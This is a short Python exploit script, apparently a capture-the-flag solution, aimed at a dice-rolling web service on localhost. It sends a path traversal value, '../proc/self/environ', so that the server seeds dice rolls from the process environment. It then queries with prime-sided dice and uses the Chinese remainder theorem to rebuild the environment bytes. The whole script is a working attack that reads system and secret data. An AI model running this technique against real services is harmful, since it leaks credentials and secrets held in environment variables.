import requests
from sympy.ntheory.modular import crt

modulos = []
remainders = []

for i in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]:
	print(i)
	r = requests.post('http://localhost:14253/', json={
		'source': '../proc/self/environ',
		'message': f'62d{i}',
	})
	dies = r.text.split(' = ')[0]
	modulos.append(i)
	remainders.append(list(map(lambda d: int(d) - 1, dies.split(' + '))))

ans = b''
for i in range(len(remainders[0])):
	remainder = list(map(lambda r: r[i], remainders))
	v, m = crt(modulos[0:10], remainder[0:10])
	ans += v.to_bytes(4, 'big')

print(ans)
